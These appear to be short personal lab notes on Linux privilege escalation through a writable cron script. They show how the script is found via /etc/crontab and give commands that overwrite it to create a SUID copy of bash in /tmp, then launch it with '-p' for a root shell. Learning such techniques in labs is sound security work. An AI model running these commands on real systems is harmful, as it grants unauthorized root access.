# Detection
---
- `cat /etc/crontab`
	- ![[Pasted image 20250430151627.png]]
- ![[Pasted image 20250430151653.png]]
- We can overwrite the script because of permissions
- ![[Pasted image 20250430154845.png]]

# Exploitation
---
- `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh`
- Edit the `overwrite.sh`file:
	- `vi /usr/local/bin/overwrite.sh`
		- `cp /bin/bash /tmp/bash_2`
		- `chmod +s /tmp/bash_2`
- ![[Pasted image 20250430155842.png]]
- `bash_2 -p`
	- ![[Pasted image 20250430155859.png]]
